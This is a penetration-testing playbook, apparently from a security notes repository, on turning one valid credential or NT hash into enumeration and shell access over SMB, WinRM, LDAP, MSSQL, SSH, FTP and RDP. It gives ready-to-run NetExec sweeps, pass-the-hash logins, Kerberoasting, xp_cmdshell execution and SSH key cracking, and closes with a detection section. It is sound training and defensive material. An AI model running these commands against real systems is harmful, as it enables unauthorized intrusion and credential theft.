# Credentialed Enumeration & Access

You have **one valid credential** — a password, an **NT hash**, a **Kerberos ticket**, or an **SSH key** — and you want to turn it into enumeration and access on whatever service is listening: SMB, WinRM, LDAP, FTP, SSH/SFTP, MSSQL, RDP, and more. This note is the per-service playbook for exactly that.

> **No password yet?** Get one first — [Password Attacks & Brute Forcing](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md) covers spraying, online brute forcing per protocol, and offline hash cracking. Come back here once you hold a credential.

Authorized engagements only. A valid login is still an intrusion — confirm the target and the account are in scope before you connect, and check the **lockout policy** before you point any credential at many hosts.

## Contents

- [The credential you hold](#the-credential-you-hold)
- [NetExec — the spine](#netexec--the-spine)
- [SMB (445)](#smb-445)
- [WinRM (5985/5986)](#winrm-59855986)
- [LDAP (389/636)](#ldap-389636)
- [FTP (21)](#ftp-21)
- [SSH / SFTP (22)](#ssh--sftp-22)
- [MSSQL (1433)](#mssql-1433)
- [RDP (3389)](#rdp-3389)
- [Other protocols NetExec speaks](#other-protocols-netexec-speaks)
- [Turn access into a shell](#turn-access-into-a-shell)
- [Where the creds come from](#where-the-creds-come-from)
- [Defense / detection](#defense--detection)
- [Related](#related)

## The credential you hold

The same account is passed to every tool below in one of these forms. Learn the flags once; they're near-identical across NetExec, Impacket, and evil-winrm.

| You have | NetExec / Impacket flag | Notes |
| --- | --- | --- |
| Password | `-u user -p 'pass'` | The common case |
| NT hash | `-H <nthash>` (or `-hashes :<nthash>`) | **Pass-the-hash** — no plaintext needed |
| Kerberos ticket | `-k` (reads `$KRB5CCNAME`) | Target by **FQDN**, not IP — see below |
| SSH key | `ssh -i id_rsa` | `chmod 600` first; crack a passphrase with `ssh2john` |
| Local (non-domain) account | add `--local-auth` | Account lives in the host's SAM, not the domain |
| Domain account | `-d <domain>` / `domain/user` | Domain is part of the *credential*, not the target |

Two rules that save an hour of confusion:

- **NTLM / pass-the-hash → target by IP. Kerberos → target by FQDN.** Tickets are bound to a Service Principal Name tied to the hostname, so a raw IP has no matching SPN and Kerberos fails. Make the name resolve first (`/etc/hosts`, or `--dc-ip`/`--target-ip` for Impacket/nxc). Full explanation in [Remote Access — IP or FQDN?](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md#target-an-ip-or-a-name-fqdn).
- **Validate before you spray.** Confirm the one credential works on one host before you aim it at a subnet, or a wrong-and-repeated password burns the lockout counter domain-wide.

## NetExec — the spine

[NetExec](https://www.netexec.wiki/) (`nxc`, the maintained fork of CrackMapExec) is the first thing to reach for: it speaks most of these protocols with the **same syntax**, so one command answers "does this credential work here, and what does it get me?" It's how you turn a single cred into a map of where it's valid and where it's **admin**.

```bash
# Does this credential work on this service? (swap the protocol word)
nxc smb   <target> -u <user> -p '<pass>'
nxc winrm <target> -u <user> -p '<pass>'
nxc ssh   <target> -u <user> -p '<pass>'

# Where does it work across a whole subnet? (one password, many hosts)
nxc smb 10.10.10.0/24 -u <user> -p '<pass>' --continue-on-success
```

Reading the output:

- `[+] domain\user:pass` — the credential is **valid** here.
- `(Pwn3d!)` — the account is **local admin** on that host (for `smb`/`winrm`/`mssql`/`rdp`): those are your execution targets.
- `[-]` — rejected. `STATUS_LOGON_FAILURE` = wrong creds; `STATUS_ACCOUNT_LOCKED_OUT` = **stop, you're tripping lockout**.

Protocols: `smb winrm ldap ssh mssql rdp ftp wmi nfs vnc`. Everything below is "what each one gives you once `nxc` says `[+]`."

## SMB (445)

The richest target for a domain credential — users, groups, shares, the password policy, and often a path to code execution.

```bash
# Validate + is this account local admin here?
nxc smb <target> -u <user> -p '<pass>'                 # (Pwn3d!) = admin → exec below

# Enumerate everything the cred can see
nxc smb <target> -u <user> -p '<pass>' --users --groups --shares --pass-pol --sessions --loggedon-users
nxc smb <target> -u <user> -p '<pass>' -M spider_plus   # crawl readable shares for interesting files

# Browse / pull files interactively
smbclient -U '<domain>\<user>%<pass>' //<target>/<share>
smbmap   -H <target> -u <user> -p '<pass>' -d <domain>  # quick read/write permission map of every share
```

- `--pass-pol` **first** — the lockout threshold decides whether you can spray at all.
- `(Pwn3d!)` → remote exec as SYSTEM via `psexec.py` / `wmiexec.py` (pass-the-hash with `-hashes`). See [Remote Access — SMB](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md#smb-445--remote-exec-as-local-admin) and the [Impacket Toolkit](../AD/Impacket%20Toolkit.md).
- Full SMB tool reference (smbclient/smbmap/rpcclient/enum4linux-ng flags): [Protocols → smb](../Protocols/smb.md#netexec--sweep-and-enumerate).

## WinRM (5985/5986)

The cleanest Windows shell — a real PowerShell session, no service artifact (unlike PsExec).

```bash
# Confirm it's reachable and the cred is admin — (Pwn3d!) means evil-winrm will land a shell
nxc winrm <target> -u <user> -p '<pass>'
nxc winrm <target> -u <user> -H <nthash>               # pass-the-hash

# Get the shell
evil-winrm -i <target> -u <user> -p '<pass>'           # password
evil-winrm -i <target> -u <user> -H <nthash>           # pass-the-hash, no plaintext
evil-winrm -i <target> -u <user> -p '<pass>' -S        # -S = SSL (5986)
```

Kerberos login, FQDN targeting, and the `getTGT.py` dance are in [Remote Access — WinRM](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md#winrm-59855986--evil-winrm-the-go-to-windows-shell). A Domain Controller is just another WinRM target.

## LDAP (389/636)

A domain credential against LDAP dumps the directory and surfaces attack paths without touching a single workstation.

```bash
# Users, groups, and the high-value flags — all read-only
nxc ldap <dc-ip> -u <user> -p '<pass>' --users --groups
nxc ldap <dc-ip> -u <user> -p '<pass>' --password-not-required --trusted-for-delegation --admin-count

# Roast straight from the directory (feeds offline cracking)
nxc ldap <dc-ip> -u <user> -p '<pass>' --asreproast asrep.txt
nxc ldap <dc-ip> -u <user> -p '<pass>' --kerberoasting kerb.txt

# Raw queries when you want exact control
ldapsearch -x -H ldap://<dc-ip> -D '<user>@<domain>' -w '<pass>' -b 'DC=corp,DC=local'
windapsearch -d <domain> -u <user> -p '<pass>' --dc <dc-ip> --members 'Domain Admins'

# Feed BloodHound — the map of what this cred can ultimately reach
bloodhound-python -u <user> -p '<pass>' -d <domain> -ns <dc-ip> -c All
```

This is the heart of the AD workflow — the roasted hashes go to [Password Attacks — offline cracking](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md#offline-hash-cracking), and the BloodHound graph drives [AD — Enumeration](../AD/Enumeration.md) and [AD — Privilege Escalation](../AD/Privilege%20Escalation.md).

## FTP (21)

```bash
nxc ftp <target> -u <user> -p '<pass>'          # validate; --ls to list the root after login
ftp <target>                                    # interactive; try anonymous:anonymous first
lftp -u <user>,'<pass>' <target>                # scriptable: mirror, mget, put
```

Often a file drop rather than a shell — but a writable web root or a user's home over FTP can become code execution. Reused passwords mean an FTP cred is worth testing against SSH and SMB too (`nxc`).

## SSH / SFTP (22)

```bash
# Validate, and optionally run one command without a full session
nxc ssh <target> -u <user> -p '<pass>'
nxc ssh <target> -u <user> -p '<pass>' -x 'id'          # -x runs a command

# Interactive shell
ssh <user>@<target>
sshpass -p '<pass>' ssh -o StrictHostKeyChecking=no <user>@<target>   # non-interactive (labs)

# Key-based (looted an id_rsa)
chmod 600 id_rsa && ssh -i id_rsa <user>@<target>
ssh2john id_rsa > id_rsa.hash && john --wordlist=rockyou.txt id_rsa.hash   # crack a passphrase

# SFTP — same credentials/key, file transfer over the SSH subsystem
sftp <user>@<target>
sftp -i id_rsa <user>@<target>
```

SSH is also your pivot once you're on — `-L` / `-D` / `-J` in [Pivoting & Tunneling](../Networking/Pivoting%20%26%20Tunneling.md). More SSH/key detail in [Remote Access — SSH](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md#ssh-22--the-standard-linux-shell).

## MSSQL (1433)

A database login is frequently a shortcut to OS command execution.

```bash
nxc mssql <target> -u <user> -p '<pass>'                 # validate ((Pwn3d!) = sysadmin)
nxc mssql <target> -u <user> -p '<pass>' -x 'whoami'     # run OS cmd via xp_cmdshell in one line
nxc mssql <target> -u <user> -p '<pass>' --local-auth    # SQL login rather than Windows auth

# Interactive client, then enable exec
mssqlclient.py <domain>/<user>:'<pass>'@<target> -windows-auth
#   SQL> enable_xp_cmdshell
#   SQL> xp_cmdshell whoami
```

Other databases (MySQL, Postgres `COPY ... FROM PROGRAM`, Redis) in [Remote Access — databases](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md#database-services-often-a-shortcut-to-os-exec).

## RDP (3389)

```bash
nxc rdp <target> -u <user> -p '<pass>'                   # does RDP accept this cred?
xfreerdp /v:<target> /u:<user> /p:'<pass>' /cert:ignore +clipboard /dynamic-resolution
xfreerdp /v:<target> /u:<user> /pth:<nthash>             # pass-the-hash (needs Restricted Admin mode)
```

## Other protocols NetExec speaks

Same `nxc <proto> <target> -u .. -p ..` shape — validate, then use the native client:

| Proto | Validate | Then |
| --- | --- | --- |
| `wmi` | `nxc wmi <target> -u .. -p ..` | `wmiexec.py` for a quiet exec path |
| `nfs` | `nxc nfs <target> -u .. -p ..` | mount exports — [Protocols → nfs](../Protocols/nfs.md) |
| `vnc` | `nxc vnc <target> -p ..` | `vncviewer <target>:5900` |

## Turn access into a shell

Validating a credential gets you *in*; catching and stabilising the session is the next step:

- Payloads, listeners, and the TTY upgrade: [Shell](../Shell/README.md).
- Service-by-service login-to-shell detail (evil-winrm extras, Impacket exec, DB-to-OS): [Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md).
- Moving host-to-host with the creds/hashes you now hold: [Lateral Movement & Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md).

## Where the creds come from

- **No password yet** → [Password Attacks & Brute Forcing](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md) — spray (the safe AD default), online brute by protocol, offline cracking.
- **Dumped hashes / tickets** → [Lateral Movement & Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md), [Impacket Toolkit](../AD/Impacket%20Toolkit.md) (`secretsdump`, DCSync).
- **Looted on a foothold** → `id_rsa`, `.pgpass`, unattended-install XML, GPP `cpassword`, saved RDP/VNC creds — see [Windows credential hunting](../Windows/Privilege%20Escalation.md) and [Privilege Escalation — credential hunting](../Privilege%20Escalation/general.md).

## Defense / detection

- **Validate-everywhere sweeps are loud:** one account authenticating to many hosts in seconds is the signature of an `nxc` sweep — alert on **4624 type 3** fan-out and **4625** failure spikes.
- **SMB exec:** service creation (**7045**) and `ADMIN$` writes from PsExec; prefer WinRM/WMI detections and enforce SMB signing to blunt relay.
- **LDAP:** bulk directory reads and SharpHound-style collection; Kerberoast/AS-REP requests (**4769/4768**) with weak ciphers.
- **Reused credentials** are what make one cred open ten services — unique passwords per account/host, tiered admin, and **MFA** on remote access break the chain.
- **Lockout + banned-password list** blunt the spray that produced the cred in the first place.

## Related

[Password Attacks & Brute Forcing](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md) (get a cred with no password) · [Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md) · [Protocols → smb](../Protocols/smb.md) · [nfs](../Protocols/nfs.md) · [AD → Enumeration](../AD/Enumeration.md) · [Lateral Movement & Credential Access](../AD/Lateral%20Movement%20%26%20Credential%20Access.md) · [Impacket Toolkit](../AD/Impacket%20Toolkit.md) · [Shell](../Shell/README.md) · [folder README](README.md)
